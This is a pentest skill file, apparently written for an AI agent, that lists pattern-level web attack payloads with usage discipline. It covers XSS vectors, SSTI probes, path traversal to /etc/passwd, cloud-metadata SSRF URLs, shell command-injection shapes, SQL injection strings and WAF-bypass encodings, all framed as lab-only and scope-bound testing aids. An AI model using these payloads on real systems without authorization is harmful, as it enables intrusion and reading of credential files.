---
name: payload-crafter
description: Pattern-level payload library for XSS, SSTI, LFI, SSRF, and command injection — context detection (HTML body/attribute/JS/CSS/URL), encoding-bypass shapes (URL/HTML/Unicode/double), polyglots, WAF-bypass patterns at syntax level. No version-specific weaponized exploits.
---

# Payload Crafter

> **Pattern-level discipline**: this skill provides payload shapes to illustrate class behavior, not ready-to-run exploits against specific target versions. Working exploits for production targets require RoE sign-off and a lab context. Version-specific 0-day payloads (gadget chains, PoCs for specific named CVEs) are not here — those belong in a closed engagement workspace, not in a reusable skill.

## When to use

Payloads are the hands-on side of vuln discovery. `web-exploit-triage` classifies; this skill provides illustrative test shapes per class, for verification in a lab or within an RoE-permitted sandbox.

Triggers on:

- A question like "what is a suitable XSS payload for JS context", "test payload for SSTI on Jinja2", "LFI example with PHP wrappers", "SSRF to cloud-metadata pattern", "WAF bypass for SQLi".
- Lab work where you are verifying a specific vuln class and need a pattern illustration.
- Training context: showing examples to developers so they see what their input validation must catch.
- Defensive context: WAF tuning, building regex rules — testers supply shapes, defenders build detection.

### When NOT (handoff)

- Classification of exploitable yes/no → `web-exploit-triage` (this skill leans on it).
- Version-specific RCE PoCs → not in this skill. Engagement-specific work.
- Chain assembly → `exploit-chain`.
- Post-exploitation payloads (reverse shells, persistence implants) → `post-exploit`. This skill stops at the first-impact shape.
- AD-specific payloads (Kerberos tickets) → `ad-attacks`.
- C2 payload staging → `c2-hygiene`.
- WAF fingerprinting of a specific production WAF in order to bypass it specifically → engagement work within RoE; this skill provides generic encoding shapes.

## Approach

Six phases. Phase 2 (class choice + context) and phase 3 (pattern library) are the core.

### 1. Context detection

A payload without context fitting does not work. Before you choose a payload, know:

- **Reflection location**: HTML body, HTML attribute, JavaScript string, JavaScript context, CSS, URL parameter, header value, JSON field, HTTP response.
- **Encoding of the channel**: is the input HTML-escaped, JS-string-escaped, URL-encoded? Which characters survive untouched?
- **Output context**: render context (browser HTML, browser JS, server-side template, command, SQL, LDAP, XPath).
- **Sanitization in the path**: framework default escape, explicit `bleach` or `DOMPurify`, allow-list validation.
- **Length limits and character filters**: some payloads are only practical at certain lengths.

Without these five, payload choice is guessing. Start with benign probes (such as `xss<>"&'1234567`) and see what survives in the response.

### 2. Class selection

Match symptom to class:

- **XSS** when input lands in an HTML/JS render context and is not context-aware-escaped.
- **SSTI** when input lands in a server-side template string (often recognizable by reflection of `{{...}}` or `${...}` evaluation).
- **LFI / Path Traversal** when input lands in a file-system call (read, include, require).
- **SSRF** when input lands in an outbound HTTP call and determines the host.
- **Command Injection** when input lands in a shell execution (subprocess, system, exec, backtick).
- **Headers / Smuggling**: HTTP request smuggling, host-header injection, etc. Specialty classes.

Cross-reference the class detection with `web-exploit-triage`. Do not send a payload without classification.

### 3. Pattern library per class

Pattern level only. What follows is a set of class illustrations freely available in any OWASP cheat sheet or PortSwigger lab — no 0-days, no specific CVE PoCs.

**XSS — context-specific shape selection**:

```
HTML body context:           <svg onload=alert(1)>
HTML attribute (unquoted):   x onmouseover=alert(1)
HTML attribute (quoted):     ">x onmouseover=alert(1)
JavaScript string:           ';alert(1);//
JavaScript context (no quotes): -alert(1)-
URL/href context:            javascript:alert(1)
Image src:                   <img src=x onerror=alert(1)>
SVG:                         <svg/onload=alert(1)>
```

Polyglots (one payload, multiple contexts) exist in OWASP collections — use when context is unknown on first probe.

**SSTI — engine fingerprint and class test**:

```
Engine-fingerprint probes (which evaluator?):
  {{7*7}}      → Jinja2/Twig/Liquid → 49
  ${7*7}       → JSP/Spring SpEL/FreeMarker → 49
  <%= 7*7 %>   → ERB/EJS → 49
  *{7*7}       → Thymeleaf → 49
  #{7*7}       → some Spring/Ruby → 49

Class test (NOT payload completion):
  Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}
  → reveals class tree, sufficient evidence for SSTI classification
```

Beware: working RCE payloads for Jinja/FreeMarker/etc. are engine-version-specific and belong in a lab context, not in this skill.

**LFI / Path Traversal — traversal shapes and wrappers**:

```
Basic traversal:             ../../../etc/passwd
URL-encoded:                 %2e%2e%2f%2e%2e%2fetc%2fpasswd
Double-encoded:              %252e%252e%252fetc%252fpasswd
Null-byte (legacy):          ../../../etc/passwd%00
PHP wrappers:                php://filter/convert.base64-encode/resource=index.php
Windows traversal:           ..\..\..\windows\win.ini
Unicode bypass:              ..%c0%afetc/passwd
```

Wrappers and encoding form depend on platform and filter stack; probe in lab.

**SSRF — protocol and target shapes**:

```
Cloud-metadata targets (pattern level):
  AWS:    http://169.254.169.254/latest/meta-data/
  GCP:    http://metadata.google.internal/
  Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01

Protocol smuggling:
  file:///etc/passwd
  gopher://target:port/_<protocol-payload>
  dict://target:11211/stat
  ldap://target/

DNS-rebinding pattern: hostname that initially resolves to a public IP, after TTL to an internal IP.
```

Verify only that the outbound call is made (DNS callback with `interactsh`, Burp Collaborator), without actually hitting sensitive internal endpoints in production.

**Command Injection — separator and bypass shapes**:

```
Common separators:  ; & | && ||
Substitution:       $(cmd) `cmd` ${cmd}
Newline:            \n cmd
Whitespace bypass:  ${IFS}cat /etc/passwd
Brace expansion:    {cat,/etc/passwd}
Encoded:            base64-decoded one-liners (in lab only)
```

For production PoC: a harmless probe (`id`, `hostname`, `whoami`), not `cat /etc/shadow` or data extraction.

**SQL Injection — class fingerprint** (already broadly covered by SAST/DAST tooling, brief here):

```
Tautology:          ' OR '1'='1
Comment-based:      ' OR 1=1--
Union-based test:   ' UNION SELECT NULL-- 
Boolean-blind:      ' AND SUBSTR((SELECT version()),1,1)='5'-- 
Time-blind:         ' AND SLEEP(5)-- 
```

Tools (sqlmap) automate production discovery; this skill provides the pattern level reviewers can read.

### 4. WAF bypass: encoding shapes at pattern level

WAFs match on signatures. Bypass shapes mutate the payload so the signature does not match while the target parser still evaluates correctly.

- **Case variation**: `<ScRiPt>`, `SeLeCt`. Cheap first attempt.
- **URL encoding**: standard, double (`%252f`), triple. Most WAFs decode 1× or 2×, not always 3×.
- **HTML-entity encoding**: `&#x3c;script&#x3e;`. Works in HTML render context.
- **Unicode equivalents**: full-width Latin (`<` = U+FF1C `＜`), homoglyphs.
- **Comment insertion** in SQL: `SE/**/LECT`, `UN/**/ION`.
- **Parameter pollution**: `param=val1&param=val2` — some WAFs see only one instance, the target parser combines.
- **Whitespace substitution**: tab `\t`, newline `\n`, carriage return, formfeed, `IFS` in shell.
- **Concatenation tricks**: SQL `'a'||'b'`, JS `String.fromCharCode(...)`.
- **HPP (HTTP Parameter Pollution)** + JSON body mismatch: parser discrepancies between WAF and app.

Discipline: work one bypass at a time and log what worked, for reproducibility and for blue-team feedback.

### 5. Lab verification and PoC discipline

- **Lab first, then production.** Build the local variant (Docker container with the same framework version) and test your payload until it works before using it elsewhere.
- **Probe payload first**: harmless evidence that the class injection works (`alert(1)`, `id`, `7*7=49`). Not full-impact straight away.
- **No data exfil against production without sign-off**. A `cat /etc/passwd` is low-impact on most systems, but you should not do it without sign-off. A `select ssn from users` certainly not.
- **Cleanup path**: if your payload leaves state behind (stored XSS, database row), name how it gets cleaned up.
- **Detection feedback** where possible: tell the blue team which payload shape you used, so their WAF/SIEM/IDS rules are tested for usefulness.

### 6. Verification-loop

Layer 1: scope (payload within RoE-permitted scope, no experiments on out-of-scope or third-party?), assumptions (payload kept at pattern level, not silently turned version-specific?), gaps (context detection verified, not guessed?). Layer 2: payload shapes attributed from public OWASP/PortSwigger sources, no version-specific gadget chains in the skill, no ready-to-run exploit for named CVEs, encoding claims (which WAF decodes which encoding) not presented as fact without verification.

## Output

Per probe or test:

```
Payload test — <class> in <context>
RoE scope:        <confirmed>
Context detect:   <HTML body | JS string | URL | ...>
Filter path:      <known | unknown>

Probes executed:
  1. <shape> → <response/observation, redacted>
  2. ...

Class confirmed:      <yes, with pattern evidence | no>
Bypasses tried:       <encoding shapes, WAF response>
Class confirmed without weaponization: <yes>

Handoff:
  - web-exploit-triage:  <classification + impact>
  - exploit-chain:       <chain candidate Y/N>
  - pentest-reporter:    <finding shape for the report>

Verification-loop: ...
```

Do not pass on to the customer: raw weaponized PoCs, production test creds, unredacted shell-spawn payloads. A pattern shape with a "verifiable in lab" doc is enough.

## References

- **OWASP XSS Filter Evasion Cheat Sheet** — [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html). Canonical XSS pattern source.
- **PortSwigger Web Security Academy** — [https://portswigger.net/web-security](https://portswigger.net/web-security). Per-vuln-class labs, the best open lab collection.
- **PayloadsAllTheThings** — [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Community collection of class payloads. Read second, verify first.
- **OWASP SSTI Wiki** — [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/) (WSTG-INPV-18). Engine-fingerprint patterns.
- **OWASP Command Injection Defense Cheat Sheet** — [https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html).
- **OWASP Path Traversal** — [https://owasp.org/www-community/attacks/Path_Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
- **HackTricks** — [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/). Community doc per attack class. Verify on use; not every entry is equally well checked.
- **CWE** — [https://cwe.mitre.org/](https://cwe.mitre.org/). Class IDs for finding classification.

## Categories

- pentest
